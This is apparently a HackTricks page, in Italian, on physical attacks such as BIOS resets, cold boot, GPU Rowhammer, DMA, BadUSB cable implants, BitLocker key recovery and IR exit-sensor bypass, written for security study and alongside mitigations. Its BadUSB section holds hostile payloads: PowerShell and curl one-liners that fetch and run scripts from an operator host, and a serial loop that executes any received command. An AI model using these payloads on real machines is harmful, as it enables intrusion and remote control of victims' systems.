# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

Per l'individuazione di interfacce a livello di scheda, console seriali, accesso alla flash, side channel e glitching, consulta [Hardware Hacking](hardware-hacking/README.md) e i relativi capitoli specifici sulle interfacce. Questa pagina tratta gli attacchi che richiedono l'accesso fisico all'intero sistema.

## Recupero della password del BIOS e sicurezza del sistema

Le impostazioni del firmware dei PC legacy possono essere ripristinate scollegando la batteria CMOS o usando un jumper documentato per cancellare il CMOS. Il tempo necessario con il sistema spento dipende dalla scheda; le password UEFI moderne o le chiavi possono risiedere nella flash non volatile, in un controller integrato o in un dispositivo di sicurezza e quindi sopravvivere alla rimozione della batteria. Consulta il manuale della scheda o del servizio di assistenza prima di cortocircuitare i pin: questa procedura può anche invalidare le misurazioni TPM e attivare il ripristino della cifratura del disco.

Nei sistemi x86 legacy, strumenti come **killCMOS** e **CmosPwd** possono ispezionare o modificare le impostazioni salvate nel CMOS da un ambiente avviabile. CmosPwd riconosce i formati delle password di un insieme documentato di vecchie famiglie di BIOS e può eseguire il backup, il ripristino o la cancellazione/terminazione dello stato CMOS; le versioni pubblicate sono destinate ad ambienti legacy DOS/Windows, Linux, FreeBSD e NetBSD.<sup>[[18]](#references)</sup> Queste utility non rimuovono genericamente le password UEFI e richiedono un accesso sufficiente all'hardware e al firmware.

Alcuni firmware per laptop visualizzano un codice di verifica specifico del produttore dopo diversi tentativi di password non riusciti. Database come [bios-pw.org](https://bios-pw.org) possono ricavare password di recupero legacy per alcuni modelli, ma molti sistemi implementano un blocco senza un codice di verifica da cui ricavare la password. Considera ogni password generata specifica del modello ed evita di esaurire i contatori dei tentativi permanenti.

### Sicurezza UEFI

Per i sistemi **UEFI** moderni, CHIPSEC può verificare le protezioni delle variabili Secure Boot. Inizia con il controllo non modificante qui sotto; la modalità facoltativa `-a modify` tenta deliberatamente di corrompere le variabili e va usata solo su un sistema di laboratorio ripristinabile. CHIPSEC stesso avverte che il suo driver con privilegi e l'accesso hardware a basso livello non sono adatti agli endpoint di produzione.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analisi della RAM e Cold Boot Attacks

La DRAM non perde immediatamente tutti i bit quando si interrompe il refresh. La velocità di decadimento varia considerevolmente in base alla tecnologia del modulo e alla temperatura; il raffreddamento può preservare dati utili molto più a lungo di un ciclo di spegnimento e riaccensione senza raffreddamento. Un cold-boot attack riavvia rapidamente il sistema in un ambiente di acquisizione minimale oppure trasferisce un modulo raffreddato, acquisisce la memoria grezza e ricostruisce le chiavi crittografiche nonostante il decadimento dei bit. Un'utilità per copiare dischi non è automaticamente uno strumento per acquisire la memoria fisica e Volatility analizza un'acquisizione, ma non la esegue; usa uno strumento di acquisizione convalidato e adatto alla piattaforma.<sup>[[12]](#references)</sup>

---

## Rowhammer su GPU contro le tabelle delle pagine

I moderni attacchi Rowhammer su GPU diventano molto più efficaci quando prendono di mira i **metadati della memoria virtuale della GPU** invece dei normali buffer. Studi recenti sulle **GPU NVIDIA Ampere con GDDR6** mostrano che un aggressore che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per collocare le strutture di paging in righe vulnerabili e poi alterare bit nella **tabella delle pagine di ultimo livello** o in una **directory delle pagine** intermedia. Una volta corrotto un singolo elemento di traduzione, l'aggressore può ottenere **lettura/scrittura arbitraria della memoria della GPU** e passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Schema di exploit

1. **Individuare le righe vulnerabili all'hammering** in GDDR6 e creare pattern di hammering non uniformi e consapevoli dei cicli di refresh, in grado di aggirare le mitigazioni in DRAM.
2. **Manipolare le allocazioni della GPU** affinché il driver collochi le strutture di traduzione delle pagine in posizioni fisiche vulnerabili all'hammering, invece di mantenerle nel pool protetto predefinito. In pratica, ciò può comportare l'esaurimento della regione di memoria bassa riservata alle tabelle delle pagine e la creazione massiva di mapping UVM sparsi, con passi controllati.
3. **Alterare i metadati di traduzione**, come **PFN** o i bit relativi all'apertura, all'interno di una voce della tabella delle pagine o della directory delle pagine, affinché la pagina virtuale controllata dall'aggressore corrisponda a pagine delle tabelle delle pagine, a memoria arbitraria della GPU o a mapping di sistema visibili all'host.
4. Riutilizzare il mapping contraffatto per modificare altre voci di traduzione e ottenere **lettura/scrittura arbitraria della memoria della GPU** tra i diversi contesti GPU.

### Passaggio all'host e mitigazioni

- Con **IOMMU disabilitato**, i mapping contraffatti dell'apertura di sistema possono esporre alla GPU qualsiasi **memoria fisica dell'host**, trasformando la primitiva sulla GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le voci delle tabelle delle pagine di ultimo livello, mentre **GeForge** dimostra che corrompere un livello della directory delle pagine può essere più semplice, perché un singolo bit alterato può reindirizzare un sottoalbero di traduzione più ampio. Non considerare critico per la sicurezza un solo livello di paging.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** resta importante perché blocca il percorso diretto verso l'accesso arbitrario alla memoria dell'host usato da GDDRHammer/GeForge, ma **non è una mitigazione completa**. **GPUBreach** mostra un secondo passaggio in cui l'aggressore corrompe buffer CPU scrivibili dalla GPU e gestiti dal driver, poi attiva bug di sicurezza della memoria nel driver NVIDIA per ottenere una primitiva di scrittura nel kernel e una **shell root**, anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- **ECC a livello di sistema** è una misura pratica di hardening sulle GPU workstation/server supportate. Le GPU consumer senza ECC offrono una difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha segnalato **1.171** bit flip su una RTX 3060 e **202** su una RTX A6000, un numero sufficiente a costruire una catena funzionante di escalation dei privilegi sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi Direct Memory Access (DMA)

Per il patching offline di UEFI IFR/NVRAM, che può ridurre l'applicazione delle regole IOMMU prima dell'avvio e abilitare una catena DMA su Windows, vedi:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** dimostra l'acquisizione e il patching della memoria tramite **DMA** su interfacce come FireWire e sulle prime configurazioni Thunderbolt, includendo firme storiche per aggirare il login. Non è semplicemente «inefficace contro Windows 10»: la possibilità di sfruttarlo dipende dall'interfaccia, dalla build del sistema, dai criteri IOMMU, dallo stato di blocco e dal supporto e dall'attivazione di Windows Kernel DMA Protection. Windows 10 versione 1803 e successive ha introdotto Kernel DMA Protection sulle piattaforme compatibili, modificando sostanzialmente la superficie di attacco.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB per accedere al sistema

Su un volume Windows non crittografato o già sbloccato, un ambiente offline può sostituire i binari delle funzioni di accessibilità, come **sethc.exe** o **Utilman.exe**, con **cmd.exe**, ottenendo un prompt dei comandi SYSTEM quando viene usata la relativa scorciatoia nella schermata di accesso. Strumenti come **chntpw** possono modificare i dati degli account locali SAM. Questi metodi non aggirano un volume BitLocker bloccato e possono danneggiare le credenziali protette con DPAPI/EFS; conserva copie forensi e backup.

**Kon-Boot** è uno strumento commerciale per aggirare l'autenticazione all'avvio, disponibile per configurazioni Windows/macOS supportate. La compatibilità dipende dal sistema operativo, dalla modalità del firmware, da Secure Boot e dalla configurazione della crittografia del disco; non decritta un volume BitLocker bloccato.<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di avvio e ripristino

- **Delete/Supr**, F2, F10 o un altro tasto del produttore può aprire la configurazione del firmware.
- **F8** apre le opzioni avanzate di avvio di Windows legacy solo nelle configurazioni in cui questa opzione è ancora abilitata; il metodo attuale per accedere al ripristino varia.
- Tenere premuto **Shift** può impedire l'accesso automatico a Windows in alcune configurazioni, anche se criteri o impostazioni del registro possono disabilitare questo comportamento.<sup>[[17]](#references)</sup>

### Dispositivi BAD USB

Dispositivi come **USB Rubber Ducky** e le schede Teensy possono enumerarsi come tastiere HID attendibili e iniettare sequenze di tasti predefinite. Il payload inizialmente dispone dei privilegi e dell'accesso al desktop della sessione connessa; le richieste UAC, il blocco dello schermo, il layout della tastiera, i tempi di esecuzione e i criteri USB degli endpoint continuano a limitarlo.<sup>[[15]](#references)</sup>

Le periferiche programmabili possono anche attaccare i parser del kernel dell'host e coordinare più dispositivi USB per preparare l'heap e divulgare informazioni:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Per un caso relativo al parser UAS di dispositivi di archiviazione di massa di Windows, vedi:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

I privilegi di amministratore o di backup consentono di creare una copia shadow o salvare gli hive del registro, così da acquisire file bloccati come **SAM** e **SYSTEM**. È una tecnica di raccolta post-compromissione, non un modo per aggirare i privilegi, e dovrebbe essere correlata agli eventi `diskshadow`/VSS e di esportazione degli hive del registro.

## Tecniche di impianto BadUSB / HID

### Gadget HID Android attivato tramite NFC

Un telefono Android con root può diventare una tastiera USB programmabile solo se il controller USB e il kernel supportano **USB gadget/HID**. Sui dispositivi compatibili, Kali NetHunter espone i profili gadget tramite **USB Arsenal**. Un'altra opzione è [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), che crea funzioni gadget ConfigFS e può esporre dispositivi carattere per tastiera/mouse come `/dev/hidg0` e `/dev/hidg1`. Lo strumento crea solo l'endpoint gadget; un processo separato deve scrivervi i report HID. L'accesso root non può compensare l'assenza nel kernel di ConfigFS, del supporto HID gadget o di un USB Device Controller utilizzabile.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Questo endpoint può essere combinato con l'NFC Android come trigger fisico. L'app [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) legge l'UID di un tag, lo converte nel formato previsto, verifica una whitelist locale e, in caso di corrispondenza, invia una sequenza di tasti configurata, simile a quella di Rubber Ducky. L'host collegato rileva normali input da tastiera e non necessita di software NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Prima di usare scorciatoie o comandi, verifica l'enumerazione e il layout della tastiera in un editor di testo vuoto. Un payload innocuo è:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Confini di fiducia importanti:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Una **whitelist di UID è identificazione, non autenticazione**. Gli UID sono pubblici e alcuni tipi di token o emulatori consentono la clonazione o l'impersonificazione. Un UID consentito copiato segue lo stesso percorso di dispatch del token originale.
- Il modulo Magisk **NfcScreenOff** modifica il servizio NFC affinché si comporti come se lo schermo fosse acceso e sbloccato. Se il telefono è già collegato a un host, questo può consentire a qualcuno di attivare il payload senza sbloccare il telefono.
- Le password, i token API e i comandi memorizzati nel payload sono segreti recuperabili su un dispositivo con root o bootloader sbloccato. Digitare una password tramite HID è un'automazione che riutilizza la password, non un'autenticazione senza password.
- L'iniezione HID agisce con i privilegi del desktop attivo e dipende dal focus, dai tempi e dal layout della tastiera dell'host. Richiedete una conferma recente dell'utente prima di eseguire azioni sensibili, evitate di includere segreti privilegiati negli script e usate un autenticatore challenge-response crittografico per l'autenticazione reale.

### Impianti in cavi gestiti tramite Wi-Fi

- Gli impianti basati su ESP32-S3 come **Evil Crow Cable Wind** si nascondono nei cavi USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il proprio stack C2 tramite Wi-Fi. L'operatore deve solo alimentare il cavo dall'host della vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con la password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per accedere all'interfaccia HTTP integrata.<sup>[[8]](#references)</sup>
- L'interfaccia browser fornisce schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload memorizzati sono contrassegnati per sistema operativo, i layout di tastiera vengono cambiati al volo e le stringhe VID/PID possono essere modificate per imitare periferiche note.
- Poiché il C2 risiede all'interno del cavo, un telefono può predisporre payload, avviarne l'esecuzione e gestire le credenziali Wi-Fi senza usare la rete dell'organizzazione: utile per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli del sistema operativo

- Le regole AutoExec associano uno o più payload da eseguire immediatamente dopo l'enumerazione USB. L'impianto esegue un fingerprinting leggero del sistema operativo e seleziona lo script corrispondente.
- Esempio di flusso di lavoro:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminale) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è automatica, basta sostituire un cavo di ricarica per ottenere un accesso iniziale “plug-and-pwn” nel contesto dell'utente connesso.

### Remote shell avviata tramite HID su Wi-Fi TCP

1. **Avvio tramite keystroke:** un payload memorizzato apre una console e incolla un loop che esegue qualsiasi dato ricevuto sul nuovo dispositivo seriale USB. Una variante minima per Windows è:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Ponte via cavo:** L’impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia una connessione TCP client (script Python, APK Android o eseguibile desktop) verso l’operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato al loop seriale sopra descritto, consentendo l’esecuzione remota di comandi anche su host air-gapped. L’output è limitato, quindi gli operatori eseguono in genere comandi alla cieca (creazione di account, preparazione di strumenti aggiuntivi e così via).

### Superficie di aggiornamento HTTP OTA

- L’interfaccia documentata di Evil Crow Cable espone un endpoint di aggiornamento del firmware non autenticato su `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Gli operatori sul campo possono cambiare al volo le funzionalità (ad es., flashare il firmware USB Army Knife) durante un engagement senza aprire il cavo, consentendo all’impianto di passare a nuove capacità pur restando collegato all’host target.

## Bypass della cifratura BitLocker

Un’acquisizione forense autorizzata di un sistema in funzione o utilizzato di recente può contenere una chiave master del volume BitLocker o materiale chiave correlato mentre il volume è sbloccato. Strumenti commerciali come Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic possono cercare nei dump di memoria, nei file di ibernazione o nei crash dump supportati, ma il risultato non è garantito. Le versioni moderne di Windows cifrano anche i crash dump quando BitLocker è abilitato, e una password di ripristino di 48 cifre salvata è un artefatto diverso da una chiave del volume presente in memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social engineering per aggiungere una chiave di ripristino

Un attaccante che convince un amministratore a eseguire comandi di gestione di BitLocker può aggiungere un protector con password di ripristino, una chiave esterna o un altro tipo di protector, per poi acquisirlo. Una password di ripristino non può essere una stringa arbitraria di zeri: le password numeriche di ripristino BitLocker devono rispettare un formato validato di 48 cifre. La sintassi pertinente per l’amministrazione autorizzata è `manage-bde -protectors -add C: -recoverypassword`; elenca i protector risultanti con `manage-bde -protectors -get C:`. Monitora le aggiunte di protector e assicurati che il nuovo materiale di ripristino venga depositato solo in posizioni approvate.<sup>[[16]](#references)</sup>

---

## Sfruttare gli switch di intrusione nello chassis / manutenzione per ripristinare il BIOS alle impostazioni di fabbrica

Molti laptop moderni e desktop con fattore di forma ridotto includono uno **switch di intrusione nello chassis**, monitorato dall’Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dello switch sia generare un avviso quando il dispositivo viene aperto, a volte i produttori implementano una **scorciatoia di ripristino non documentata**, attivata quando lo switch viene azionato secondo una sequenza specifica.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l’attacco

1. Lo switch è collegato a un **interrupt GPIO** sull’EC.
2. Il firmware in esecuzione sull’EC tiene traccia della **durata e del numero di pressioni**.
3. Quando viene riconosciuta una sequenza predefinita, l’EC richiama una routine *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS del sistema**.
4. Al successivo avvio, i modelli interessati caricano lo stato firmware ripristinato. A seconda del produttore e della revisione, lo stato cancellato può includere una password supervisor, impostazioni di avvio personalizzate o chiavi Secure Boot registrate; lo stato del TPM e gli effetti sulla cifratura del disco devono essere valutati separatamente.

> Un ripristino del firmware può riattivare le opzioni di avvio esterno, ma **non** decifra i dati archiviati. BitLocker o un altro sistema di cifratura completa del disco può entrare in modalità di ripristino dopo modifiche al TPM/firmware e continuare a proteggere l’unità interna in assenza di una chiave di ripristino.<sup>[[16]](#references)</sup>

### Esempio reale – laptop Framework 13

La scorciatoia di ripristino per Framework 13 (11ª/12ª/13ª generazione) è:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Dopo il decimo ciclo, l'EC imposta un flag che ordina al BIOS di cancellare la NVRAM al riavvio successivo. L'intera procedura richiede circa 40 s e **solo un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura di Exploitation generica

1. Accendere o sospendere e riattivare il target, così che l'EC sia in esecuzione.
2. Rimuovere il coperchio inferiore per esporre l'interruttore anti-intrusione/manutenzione.
3. Riprodurre la sequenza di commutazione specifica del vendor (consultare la documentazione e i forum oppure effettuare il reverse-engineering del firmware dell'EC).
4. Rimontare il dispositivo e riavviarlo, quindi verificare quali impostazioni del firmware e credenziali sono effettivamente cambiate.
5. Se si è autorizzati ed è disponibile l'avvio da supporto esterno, avviare un'immagine live controllata. Una volta sbloccato legittimamente un volume interno (o se non era mai stato cifrato), l'ambiente live può acquisire credenziali e dati oppure esaminare la EFI System Partition. Modificare tale partizione per installare un implant EFI è un'operazione persistente e altamente invasiva, limitata da Secure Boot, measured boot, protezione dalla scrittura del firmware e monitoraggio degli endpoint. Lo storage cifrato resta inaccessibile senza la chiave o il materiale di ripristino.

### Rilevamento e mitigazione

* Registrare gli eventi di intrusione nello chassis nella console di gestione del sistema operativo e correlarli con reset BIOS inattesi.
* Applicare **sigilli antimanomissione** a viti e coperchi per rilevare eventuali aperture.
* Tenere i dispositivi in **aree fisicamente controllate**; presumere che l'accesso fisico equivalga a una compromissione totale.
* Se disponibile, disabilitare la funzione vendor “maintenance switch reset” oppure richiedere un'autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## Iniezione IR occulta contro sensori di uscita senza contatto

### Caratteristiche del sensore
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED a infrarossi vicini a un modulo ricevitore simile a quello di un telecomando TV, che segnala un livello logico alto solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una copertura in plastica impedisce all'emettitore e al ricevitore di puntarsi direttamente, quindi il controller presume che ogni portante convalidata provenga da un riflesso nelle vicinanze e attiva un relè che apre l'elettroserratura.
- Quando il controller rileva la presenza di un target, spesso modifica l'inviluppo di modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst corrispondente alla portante filtrata.

### Flusso di attacco
1. **Acquisire il profilo di emissione** – collegare un analizzatore logico ai pin del controller per registrare le forme d'onda pre-rilevamento e post-rilevamento che pilotano il LED IR interno.
2. **Riprodurre solo la forma d'onda “post-rilevamento”** – rimuovere o ignorare l'emettitore originale e pilotare un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché al ricevitore interessano solo il numero di impulsi e la frequenza, considera la portante contraffatta come un riflesso autentico e attiva la linea del relè.
3. **Controllare la trasmissione** – trasmettere la portante in burst calibrati (ad es. decine di millisecondi attiva, con intervalli simili) per fornire il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. Un'emissione continua desensibilizza rapidamente il sensore e impedisce l'attivazione del relè.

### Iniezione riflessiva a lunga distanza
- Sostituendo il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione, è possibile attivare il sensore in modo affidabile da ~6 m di distanza.
- L'attaccante non deve avere una linea di vista diretta con l'apertura del ricevitore: puntando il fascio verso pareti interne, scaffalature o telai di porte visibili attraverso il vetro, l'energia riflessa può entrare nel campo visivo di ~30° e simulare un gesto della mano a distanza ravvicinata.
- Poiché i ricevitori si aspettano solo riflessi deboli, un fascio esterno molto più potente può rimbalzare su più superfici restando sopra la soglia di rilevamento.

### Torcia d'attacco weaponized
- Integrando il driver in una torcia commerciale si nasconde lo strumento in bella vista. Sostituire il LED visibile con un LED IR ad alta potenza compatibile con la banda del ricevitore, aggiungere un ATtiny412 (o simile) per generare i burst a ≈30 kHz e usare un MOSFET per assorbire la corrente del LED.
- Una lente zoom telescopica restringe il fascio per aumentare portata e precisione, mentre un motore a vibrazione controllato dall'MCU fornisce una conferma tattile dell'attivazione della modulazione senza emettere luce visibile.
- Alternare diversi pattern di modulazione memorizzati (frequenze portanti e inviluppi leggermente diversi) aumenta la compatibilità tra famiglie di sensori rimarchiati, consentendo all'operatore di scandire le superfici riflettenti finché il relè scatta udibilmente e la porta si apre.

---

## References

- [1] [GDDRHammer: disturbare notevolmente le righe DRAM — attacchi Rowhammer tra componenti da GPU moderne](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: usare il Rowhammer sulla memoria GDDR per contraffare le tabelle delle pagine GPU, per divertimento e profitto](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: attacchi di escalation dei privilegi sulle GPU usando Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avviso di sicurezza: Rowhammer - luglio 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Premere qui per pwnare”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guida al reset della scheda madre](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassare i sensori IR di uscita senza contatto con una torcia IR occulta”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Collega, avvia, pwn: hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attacco Rowhammer contro i chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentazione ufficiale di Kon-Boot e informazioni sulla compatibilità](https://kon-boot.com/)
- [11] [Documentazione di CHIPSEC - protezioni delle variabili Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Per non dimenticare: attacchi cold boot alle chiavi di cifratura](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipolazione della memoria fisica tramite DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protezione DMA del kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentazione di Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guida alle operazioni di BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento del tasto Shift e dell'accesso automatico](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - documentazione e download di CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentazione di Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentazione del kernel Linux - driver gadget USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Trasformare un telefono Android con root in un autenticatore NFC e uno strumento di automazione per il PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
